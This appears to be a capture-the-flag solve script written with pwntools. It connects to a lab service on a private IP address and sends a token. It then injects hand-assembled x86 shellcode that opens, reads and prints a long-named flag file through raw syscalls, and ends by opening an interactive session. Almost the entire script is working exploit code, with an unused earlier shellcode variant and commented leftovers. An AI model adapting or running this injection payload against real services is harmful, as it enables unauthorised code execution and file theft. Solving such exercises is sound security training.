from pwn import *
p = remote('10.214.10.18',13647)
payload = '3160104501.6880c7b179fd087c3c9a75917a028647'
p.sendline(payload)
shellcode = ''

shellcode += asm('xor ecx,ecx;mov eax,0x5;push ecx;push 0x7478742e;push 0x656d614e;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676767;push 0x67676767;push 0x6c46676e;push 0x30303030;push 0x30303030;push 0x30303030;push 0x306f4c72;push 0x65707553; mov ebx,esp;xor edx,edx;int 0x80;')

shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0xB0;int 0x80;')

shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')
payload = asm('sub esp,100;')
payload += asm('xor ecx,ecx;')
payload += asm('xor edx,edx;')
#payload += asm('xor eax,eax;')
#payload += asm('xor ebx,ebx;')
#payload += asm('push ecx;')
payload += asm('push 0')
payload += asm('push 0x7478742e;')
payload += asm('push 0x656d614e;')
payload += asm('push 0x67676767;')
payload += asm('push 0x67676767;')
payload += asm('push 0x67676767;')
payload += asm('push 0x67676767;')
payload += asm('push 0x67676767;')
payload += asm('push 0x67676767;')
payload += asm('push 0x6c46676e;')
payload += asm('push 0x30303030;')
payload += asm('push 0x30303030;')
payload += asm('push 0x30303030;')
#0x306f4c72
#0x65707553
payload += asm('push 0x306f4c72;')
payload += asm('push 0x65707553;')
#payload += asm('push 0x2f2f2f65;')
#payload += asm('push 0x6d6f682f;')
payload += asm('mov ebx,esp;')
payload += asm('mov al,5;')
payload += asm('int 0x80;')
payload += asm('nop;')
payload += asm('mov ebx,eax;')
payload += asm('mov ecx,esp;')
payload += asm('mov edx,60;')
payload += asm('mov eax,3;')
payload += asm('int 0x80;')
payload += asm('nop;')
payload += asm('mov ebx,1;')
payload += asm('mov ecx,esp;')
#payload += asm('mov edx,eax;')
payload += asm('mov eax,4;')
payload += asm('int 0x80;')
payload += asm('nop;')
payload += asm('add esp,148;')
payload += asm('ret;')
p.recvuntil('Give my your shellcode:')

p.sendline(payload)

print p.recv()



p.interactive()
#0x7478742e
#0x656d614e
#0x67676767
#0x67676767
#0x67676767
#0x67676767
#0x67676767
#0x67676767
#0x6c46676e
#0x30303030
#0x30303030
#0x30303030